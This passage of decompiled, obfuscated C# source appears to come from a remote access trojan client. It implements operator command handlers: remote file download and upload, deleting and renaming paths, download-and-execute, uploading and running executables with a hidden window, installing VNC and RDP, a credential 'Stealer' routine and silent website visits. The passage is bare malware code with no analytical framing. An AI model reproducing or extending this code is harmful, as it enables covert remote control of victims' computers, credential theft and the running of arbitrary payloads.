    }
    catch (SecurityException ex)
    {
      action("GetDirectory No permission");
    }
    catch (PathTooLongException ex)
    {
      action("GetDirectory Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("GetDirectory Directory not found");
    }
    catch (FileNotFoundException ex)
    {
      action("GetDirectory File not found");
    }
    catch (IOException ex)
    {
      action("GetDirectory I/O error");
    }
    catch (Exception ex)
    {
      action("GetDirectory Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.鈽伋裄\uF489ｩ\uE8A4깢䱄萲꯵\u0CBB갍돏ｍ洴녧獝洠鹭\u2ED8 && !string.IsNullOrEmpty(䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.ᑰ袬ꄨ쐶恊鶹摓婟뮾ጎ쥾剻钵蟚田䌼艔\uF29C킄ᵝ))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(䞄ყ໌듃휴Щӳ镾ቯ臝䕻쎌荷łẅ쑄.ᑰ袬ꄨ쐶恊鶹摓婟뮾ጎ쥾剻钵蟚田䌼艔\uF29C킄ᵝ, true).Execute(client);
      }
    }
  }

  public static void \u1DE8挤\u9FF1콏\uF518ꄎ撣䰡쪀\u2342ஹ혔洮\u2457ᔛ厨磋恺\u2078\uFBB4(
    DoDownloadFile command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.䈁ꫢ\u2815勯剳殛ल푤\u09DE罙撼\uE07D枮ﲱ饡\u21CC彬ࣲ胮\u2680()
    {
      \uFFFD봗끽綼\uF856또䰈\u248D槜결\uE906䤂\uA7CA懇ɘ\uEE2D蛡\u2027\uFFFD獦 = command,
      竉솘堓鏠ᇴկܩꪛ솃\u02E9㽲攲穴鞬륎㴷\u2033\uEBF6爐\u29BE = client
    }.\uFB42\uE212ᑆ\u09F3ﬠ\uECC0\u1879步枊၃\uE098灣늻ퟓ숖釀\uF2F2釨\uFFFD靼)).Start();
  }

  public static void 䤊\uFFFD欆Ꝙ喡\u26AA陑뇎鞻\u1FC5譡ﱥ㱃㨅\uE31Dدꮩᆆ丙ỏ(
    DoDownloadFile command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.照觤쓣唣䶨\uF26B쯥좿蜴놨漜\u2296ᖍ۳Ḿ㧬䔨\u2F3C㲸틚()
    {
      \uFFFD箶艾\uFFFD᩸\u00B6폢䖜찉Ʞ\uE8BE䢈煜ᨰ\uFFFD\uFFFD㽢\uE8B0\uF8E9Ⴗ = command,
      說쥈ퟋ敘ᵟ㰗\u2FC3넮搫\u295B\uE5C0\uE71F่혊䨘\uE5FD䐎\u2A03\uE62E諝 = client
    }.噄쌠洒ö릝迡嶗춅葷巃压ꍬ궟㵂\uE34Dⴌ\u299D풅玮殘)).Start();
  }

  public static void ᛗ鵱쟝\u2F76跶났ᇙ\uE367䆘︢糵쟑팈ᡁ笀ꂸ㻶峅\uEE8F瑿(
    DoDownloadFileCancel command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.콭\u21BFꮒꔎ艥佡\uFFFD癎\uE2B2\uE3F5\u2361뷒\uE96F䗝\uE4D4骆̨磢\uEE76འ.ContainsKey(command.ID))
      return;
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.콭\u21BFꮒꔎ艥佡\uFFFD癎\uE2B2\uE3F5\u2361뷒\uE96F䗝\uE4D4骆̨磢\uEE76འ.Add(command.ID, "canceled");
    new DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
  }

  public static void ⴡ뀨敡\u33AA螋롺\u23E1\uF471ஹペ\uE03A곦깾瑷ᰣ둷왐䉊\uE5D1뾷(
    DoUploadFile command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (command.CurrentBlock == 0 && System.IO.File.Exists(command.RemotePath))
      蛲鷿㹣\uF592홅\uE8CB\uE05E泆菘ꕾꂥ\u23ED戅立\uF0BB夞鍋ᑄ㶻馚.њኋ\uE563Ṯ\uEFE3\uE6D8䬙䙒瀇㹆\uE277\uE082\u29A2뗮㩹䝞耏\u1940쑊溘(command.RemotePath);
    new 䇎ꡲ㱨秋秚饹꯴儎縥\uFFFD膚\u27E1\u08DC蘯\uE5AAᜊ퍔薭瘴쌱(command.RemotePath).\uE179婎䠡\u287F\uFFFD稱垷䢝\uF49E덄\u2A52ﴰ\uEC0E눇譁欲ⴙ뗡롽豼(command.Block, command.CurrentBlock);
  }

  public static void 蠺㵡\uE55Cꛥ\uE493鼲㙆ᠠ\uF7FE뮊銍\uFFFD\uE8F9\u0CDB\uEFA2판繗̕䑚ڟ(
    DoPathDelete command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.훯㩷즍\u2004ꆔ猐掤\uFFFDⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶 훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.훯㩷즍\u2004ꆔ猐掤\uFFFDⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶();
    // ISSUE: reference to a compiler-generated field
    훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.몔Ⱄ櫝\uE3BA闧ꥠ땹劯숾\u33EC锂堳篐㤂䋒숄\u2941ᦤ鬪眠 = false;
    // ISSUE: reference to a compiler-generated field
    훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.ꫩᰜ\u2EBC䫗糰ړ䚎ﴲ\uE366侪됬\uFFFD喏\uFFFD击\u21D7䓅럃䮅\uE5DD = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.阡䃭쾡訛㽰癃ⴘꗺ㶒횔\uE2BE쏐퇮ᰏ攎ᝠ䌫劰냾鯈);
    try
    {
      switch (command.PathType)
      {
        case \uEB04\uFFFD㯫༷\uEEB2넊짜鸌醍鈏\u4DE0뗚鸶쯯屄쎀锉竬\uEACA\uFEFE.尰飍\uF5BF멨㐓\uFFFD\uE2B6場ᕧݞ㬱\uFFFD刪\u0A79迭괷ू淩\u0D78䫻:
          System.IO.File.Delete(command.Path);
          new SetStatusFileManager("Deleted file", false).Execute(client);
          break;
        case \uEB04\uFFFD㯫༷\uEEB2넊짜鸌醍鈏\u4DE0뗚鸶쯯屄쎀锉竬\uEACA\uFEFE.\u2344荷\uFFFD\uE568偖\uFFFDり\uE37D\u2219춊䋈덕ﶷ謙릱\uEF1Bꭎ\uEA85밤䲫:
          Directory.Delete(command.Path, true);
          new SetStatusFileManager("Deleted directory", false).Execute(client);
          break;
      }
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.똙엣墎鳹頻阷\uE1A1귵쎠ಾ䝠ᄞ䪔\uEEFE抚쵝ꂇ缭ೡ堲(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("DeletePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("DeletePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("DeletePath Path not found");
    }
    catch (IOException ex)
    {
      action("DeletePath I/O error");
    }
    catch (Exception ex)
    {
      action("DeletePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.몔Ⱄ櫝\uE3BA闧ꥠ땹劯숾\u33EC锂堳篐㤂䋒숄\u2941ᦤ鬪眠 && !string.IsNullOrEmpty(훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.ꫩᰜ\u2EBC䫗糰ړ䚎ﴲ\uE366侪됬\uFFFD喏\uFFFD击\u21D7䓅럃䮅\uE5DD))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(훯㩷즍ꆔ猐掤ⵌ쳚鼤㪧䄱륟䉽ꘞ硆Ꮽꃸ厶.ꫩᰜ\u2EBC䫗糰ړ䚎ﴲ\uE366侪됬\uFFFD喏\uFFFD击\u21D7䓅럃䮅\uE5DD, false).Execute(client);
      }
    }
  }

  public static void 启䖯\u4DFAꂹ\uFFFD㴽\u2927偿붏\uFFFD䇰끑盄ᱠ饭쟷ᰬ䚥\u2888謢(
    DoPathRename command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.䃶覺얨䅻ṉ\uF164翚夊\u3280颎蜳ꦞ\uF363渂\uF0F3ഷ㑗촗\uEF89抨 䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.䃶覺얨䅻ṉ\uF164翚夊\u3280颎蜳ꦞ\uF363渂\uF0F3ഷ㑗촗\uEF89抨();
    // ISSUE: reference to a compiler-generated field
    䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.肺類ꇥ愂멂伆ၧ쫢\u20C1鍮\uFFFD콪酪䦜輘輚詩䡪\uF5C7\uE68A = false;
    // ISSUE: reference to a compiler-generated field
    䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.\uED44ᴵ䀷仮雋䗟磎衵뀮ꠊ\u26D9\u0B34珀㿋\uE542畠螽戬럜픙 = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.鱑\uFFFD困做쇮㠼썓콽\u2918\u19E3舌\u2B2C明阘駻煗\u3318祠憎굩);
    try
    {
      switch (command.PathType)
      {
        case \uEB04\uFFFD㯫༷\uEEB2넊짜鸌醍鈏\u4DE0뗚鸶쯯屄쎀锉竬\uEACA\uFEFE.尰飍\uF5BF멨㐓\uFFFD\uE2B6場ᕧݞ㬱\uFFFD刪\u0A79迭괷ू淩\u0D78䫻:
          System.IO.File.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed file", false).Execute(client);
          break;
        case \uEB04\uFFFD㯫༷\uEEB2넊짜鸌醍鈏\u4DE0뗚鸶쯯屄쎀锉竬\uEACA\uFEFE.\u2344荷\uFFFD\uE568偖\uFFFDり\uE37D\u2219춊䋈덕ﶷ謙릱\uEF1Bꭎ\uEA85밤䲫:
          Directory.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed directory", false).Execute(client);
          break;
      }
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.똙엣墎鳹頻阷\uE1A1귵쎠ಾ䝠ᄞ䪔\uEEFE抚쵝ꂇ缭ೡ堲(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("RenamePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("RenamePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("RenamePath Path not found");
    }
    catch (IOException ex)
    {
      action("RenamePath I/O error");
    }
    catch (Exception ex)
    {
      action("RenamePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.肺類ꇥ愂멂伆ၧ쫢\u20C1鍮\uFFFD콪酪䦜輘輚詩䡪\uF5C7\uE68A && !string.IsNullOrEmpty(䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.\uED44ᴵ䀷仮雋䗟磎衵뀮ꠊ\u26D9\u0B34珀㿋\uE542畠螽戬럜픙))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(䃶覺얨䅻ṉ翚夊颎蜳ꦞ渂ഷ㑗촗抨.\uED44ᴵ䀷仮雋䗟磎衵뀮ꠊ\u26D9\u0B34珀㿋\uE542畠螽戬럜픙, false).Execute(client);
      }
    }
  }

  public static void \uF60E봚\u2B7E㑥㾊딢鹑\uE2D2負ꂔ\u2475\uF43C袔혁\uFFFD㨙\uEB15遻ↂ蹴(
    DoDownloadAndExecute command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uFFFD鷞듢溇暬蔘\uECD2\uE5EDㅡ띮攉\u297F\uFFFD䭅\u2B0A푮䵱옉\uE261\u0B75 鷞듢溇暬蔘ㅡ띮攉䭅푮䵱옉 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uFFFD鷞듢溇暬蔘\uECD2\uE5EDㅡ띮攉\u297F\uFFFD䭅\u2B0A푮䵱옉\uE261\u0B75();
    // ISSUE: reference to a compiler-generated field
    鷞듢溇暬蔘ㅡ띮攉䭅푮䵱옉.믴\uF7C7항靵ꘒে㧬\uFFFD鰼\uA705\uFFFD\uFFFD㹖ꚴ쁡킣\u4DFF䑭䥻\uED5C = command;
    // ISSUE: reference to a compiler-generated field
    鷞듢溇暬蔘ㅡ띮攉䭅푮䵱옉.\uF832識\u2F9B츙啸㡕Ꞥ\u2323\uFFFD脴霿Ꝺ言聆ꁻ큯ꫥ먹ꕽ꥓ = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Downloading file...").Execute(鷞듢溇暬蔘ㅡ띮攉䭅푮䵱옉.\uF832識\u2F9B츙啸㡕Ꞥ\u2323\uFFFD脴霿Ꝺ言聆ꁻ큯ꫥ먹ꕽ꥓);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(鷞듢溇暬蔘ㅡ띮攉䭅푮䵱옉.定\uFFFD沃䊳䋛ᗩ\uFFFD\uEC7E\u300E묾㓮뻝ꅺ眒ࣣ冧襎蟢痏\uF57D)).Start();
  }

  public static void 뺗\uF1C8\u2AA5왘뗸ﯺ쓎㢳惛蟵帮멨\uF5E2ـ狘ﺾ끰咍ᚦ홹(
    DoInstallVNC command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uFFFD\uEA99산\uED12廳糴ጕ旹腀갃跟\u2EBA백涋㵩깑\uF08E䙩运〭 산廳糴ጕ旹腀갃跟백涋㵩깑䙩运〭 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uFFFD\uEA99산\uED12廳糴ጕ旹腀갃跟\u2EBA백涋㵩깑\uF08E䙩运〭();
    // ISSUE: reference to a compiler-generated field
    산廳糴ጕ旹腀갃跟백涋㵩깑䙩运〭.如柠晴쁳軳醝检\uEFFF昿鮮蘶\uE0F7錁訩꣒\uF018祅͜붗徠 = command;
    // ISSUE: reference to a compiler-generated field
    산廳糴ጕ旹腀갃跟백涋㵩깑䙩运〭.摀ᗖ숴ᵿ\u2AD3\u139B\uFBD2\u001B퀌\u0482ꢷ\uFFFD븺풡\uFF1A놯兿몟\u0A7B㯊 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing VNC...").Execute(산廳糴ጕ旹腀갃跟백涋㵩깑䙩运〭.摀ᗖ숴ᵿ\u2AD3\u139B\uFBD2\u001B퀌\u0482ꢷ\uFFFD븺풡\uFF1A놯兿몟\u0A7B㯊);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(산廳糴ጕ旹腀갃跟백涋㵩깑䙩运〭.단錅䀪㼦酩\u139A꤭陓\uFFFD\uFFFD텭Ḅᜥ콤\uF126䨇䴃喰饻勚)).Start();
  }

  public static void 말찺\u27F8葉ꏘ壇\u2D79匰㴺嘜靜\uA4BF\u283C\uFFFD\u26AFུ\uF690㒡ऺ柏(
    DoInstallRDP command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.谿\uE7FD\uF85Bᘵ뫆֦됷ﰁ帋\uE1F7敫௮拰\uF3F7쩜鎴倠Ў棕\u2A93 谿ᘵ뫆֦됷ﰁ帋敫௮拰쩜鎴倠Ў棕 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.谿\uE7FD\uF85Bᘵ뫆֦됷ﰁ帋\uE1F7敫௮拰\uF3F7쩜鎴倠Ў棕\u2A93();
    // ISSUE: reference to a compiler-generated field
    谿ᘵ뫆֦됷ﰁ帋敫௮拰쩜鎴倠Ў棕.\u136Cǃ蔵\u29D1ਖ਼ߢ\u2F34ꗂ뾄\uE80B둺낧祉꿨けⅡ궢\uE320\u230C软 = command;
    // ISSUE: reference to a compiler-generated field
    谿ᘵ뫆֦됷ﰁ帋敫௮拰쩜鎴倠Ў棕.皔\u0E3E䘈胉恀ᱎ\u2252龯ခ\u4DCC仉뵍ẍ\uEA72篚\uEDA1뉸二쯻傠 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing RDP...").Execute(谿ᘵ뫆֦됷ﰁ帋敫௮拰쩜鎴倠Ў棕.皔\u0E3E䘈胉恀ᱎ\u2252龯ခ\u4DCC仉뵍ẍ\uEA72篚\uEDA1뉸二쯻傠);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(谿ᘵ뫆֦됷ﰁ帋敫௮拰쩜鎴倠Ў棕.롙ኹԳ뻼瀽\uE0FA䆇\uFFFD㲭\uF6CBꀺ騈㗐嫌綔ቛ\u0BA5靋ӫ㡐)).Start();
  }

  public static void 約碴\u3302ꜫ\uFFFD纁\uFFFD扪\uE2E3ೈો\u058E皌捖綌鮸醰팲瀧樃(
    DoStealer command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uEF24槊뼸魐\uEC65㥤᭬緕\u2B7F萎뚭昺鵃\uF2D7툢䲗俛\u2EA3處䥜 槊뼸魐㥤᭬緕萎뚭昺鵃툢䲗俛處䥜 = new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.\uEF24槊뼸魐\uEC65㥤᭬緕\u2B7F萎뚭昺鵃\uF2D7툢䲗俛\u2EA3處䥜();
    // ISSUE: reference to a compiler-generated field
    槊뼸魐㥤᭬緕萎뚭昺鵃툢䲗俛處䥜.䘨첅䬀\u0C53匝舀볪軐䱴赑瀠鷘歠\u2F76鹅\uE509\uF629\uE922\uFFFDǕ = command;
    // ISSUE: reference to a compiler-generated field
    槊뼸魐㥤᭬緕萎뚭昺鵃툢䲗俛處䥜.곥8\uAB6Eク뵑\u10C8籝ꪶᇢ턏햸異\uFFFD\uF7E6㛫䴻ᡄٺ鍈꧔ = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Stealer Unleashed....").Execute(槊뼸魐㥤᭬緕萎뚭昺鵃툢䲗俛處䥜.곥8\uAB6Eク뵑\u10C8籝ꪶᇢ턏햸異\uFFFD\uF7E6㛫䴻ᡄٺ鍈꧔);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(槊뼸魐㥤᭬緕萎뚭昺鵃툢䲗俛處䥜.ⱈ䇀\u19CA\uF481\u209F\uEFD9鰹읗ꬃ矩䊵聲碧ᤉ삊缄憌ᮠ騌띪)).Start();
  }

  public static void \uF7AF碱놠\uFFFD\uE4FF熰䮝\uFFFD撉लㄏଷ싕\u272Eㅢ먹湆䀺\uFFFDㅳ(
    DoUploadAndExecute command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    if (!\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(command.ID))
      \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Add(command.ID, 环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.䍔偲ീ絇\uE340甿\u2615稌猒氜\uE708㦌\uF4C5撔䣨谎럫\uE3BF횡跃(Path.GetExtension(command.FileName)));
    string str = \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮[command.ID];
    try
    {
      if (command.CurrentBlock == 0 && Path.GetExtension(str) == ".exe" && !环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.顳쎩隥鑽\uFFFD̰\uEE6E㖸锰\uF2DB쇟颹옞閨\uFFFD\uF7D6\u2082体겡깗(command.Block))
        throw new Exception("No executable file");
      䇎ꡲ㱨秋秚饹꯴儎縥\uFFFD膚\u27E1\u08DC蘯\uE5AAᜊ퍔薭瘴쌱 䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱 = new 䇎ꡲ㱨秋秚饹꯴儎縥\uFFFD膚\u27E1\u08DC蘯\uE5AAᜊ퍔薭瘴쌱(str);
      if (!䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱.\uE179婎䠡\u287F\uFFFD稱垷䢝\uF49E덄\u2A52ﴰ\uEC0E눇譁欲ⴙ뗡롽豼(command.Block, command.CurrentBlock))
        throw new Exception(䇎ꡲ㱨秋秚饹꯴儎縥膚蘯ᜊ퍔薭瘴쌱.LastError);
      if (command.CurrentBlock + 1 != command.MaxBlocks)
        return;
      if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(command.ID))
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Remove(command.ID);
      环㴭鮖圛鐂翎瀉솦\uEFA7\u0E5D뚾ꕂꍖ읿ᗕ\uF637軯\u02D6敷ᆴ.覹廕摈퍠㔀謌삋ⅳﱗ즫\uECBB搸\uE3AEച\uEC8D墑翷ﵛള嚶(str);
      ProcessStartInfo startInfo = new ProcessStartInfo();
      if (command.RunHidden)
      {
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
      }
      startInfo.UseShellExecute = false;
      startInfo.FileName = str;
      Process.Start(startInfo);
      new SetStatus("Executed File!").Execute(client);
    }
    catch (Exception ex)
    {
      if (\uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.ContainsKey(command.ID))
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.쾪趔\uEB29꼏\uFFFD\u0E72誫據\uE455㨜킑桁곱糖㔬豑\uFFFDᑏ듮냮.Remove(command.ID);
      蛲鷿㹣\uF592홅\uE8CB\uE05E泆菘ꕾꂥ\u23ED戅立\uF0BB夞鍋ᑄ㶻馚.њኋ\uE563Ṯ\uEFE3\uE6D8䬙䙒瀇㹆\uE277\uE082\u29A2뗮㩹䝞耏\u1940쑊溘(str);
      new SetStatus("Execution failed: " + ex.Message).Execute(client);
    }
  }

  public static void \uFFFD２\uE945횖ﰥ忀\u2436Ὂ䭽業커ﻙ斪欛鉣蔊摵飦濁ૃ(
    DoVisitWebsite command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    string str = command.URL;
    if (!str.StartsWith("http"))
      str = "http://" + str;
    if (!Uri.IsWellFormedUriString(str, UriKind.RelativeOrAbsolute))
      return;
    if (!command.Hidden)
    {
      Process.Start(str);
    }
    else
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(str);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
        httpWebRequest.AllowAutoRedirect = true;
        httpWebRequest.Timeout = 10000;
        httpWebRequest.Method = "GET";
        using ((HttpWebResponse) httpWebRequest.GetResponse())
          ;
      }
      catch
      {
      }
    }
    new SetStatus("Visited Website").Execute(client);
  }

  public static void \uFFFD綨垅厶ྂ峚쑇늑ﾑࠧ尜䔴䇘\u2A0Eﺸ퐐盒뎭忹半(
    DoShowMessageBox command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.뜭覸掕\uFFFD‿\u2F3B短鲛㳇柰愊鄤\uE77E琞\u232C蕔ܷᜰꝁ擷()
    {
